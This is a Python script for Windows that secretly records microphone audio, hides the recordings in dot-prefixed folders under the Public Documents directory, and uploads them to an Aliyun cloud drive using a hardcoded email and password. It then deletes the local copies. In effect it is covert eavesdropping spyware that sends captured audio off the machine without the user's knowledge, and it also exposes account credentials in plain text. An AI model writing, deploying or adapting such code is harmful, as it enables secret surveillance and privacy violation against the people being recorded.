import os
import time
import pyaudio
import wave
from aligo import Aligo
import getpass

user_name = getpass.getuser()


def start_audio(time, save_file="test.wav"):
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 16000
        RECORD_SECONDS = time
        WAVE_OUTPUT_FILENAME = save_file

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)
        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        return True
    except:
        return False


def createPath():
    if not os.path.isdir("C:\\Users\\Public\\Documents\\.Audio\\.temp"):
        os.mkdir("C:\\Users\\Public\\Documents\\.Audio\\.temp")
    if not os.path.isfile("C:\\Users\\Public\\Documents\\.Audio\\audio.ini"):
        with open("audio.ini", mode='w', encoding="utf-8") as f:
            f.write("5")


def uploadFile(path):
    try:
        ali = Aligo(email=("1562555464@qq.com", "123123123"))
        uploadFilder = ali.get_folder_by_path("upload/voices")
        if type(path) == list:
            ali.upload_files(path, uploadFilder.file_id)
        elif os.path.isfile(path):
            ali.upload_file(path, uploadFilder.file_id)
        elif os.path.isdir(path):
            ali.upload_folder(path, uploadFilder.file_id)
        return True
    except:
        return False


if __name__ == '__main__':
    createPath()
    rcTime = 0
    with open("C:\\Users\\Public\\Documents\\.Audio\\audio.ini", mode='r', encoding="utf-8") as f:
        rcTime = int(f.read())
    curtime = time.strftime('%Y%m%d_%H%M', time.localtime(time.time()))
    keyname = curtime + f"_{user_name}.wav"
    if start_audio(time=rcTime, save_file=f"C:\\Users\\Public\\Documents\\.Audio\\.temp\\{keyname}"):
        if uploadFile(f"C:\\Users\\Public\\Documents\\.Audio\\.temp\\{keyname}"):
            os.remove(f"C:\\Users\\Public\\Documents\\.Audio\\.temp\\{keyname}")
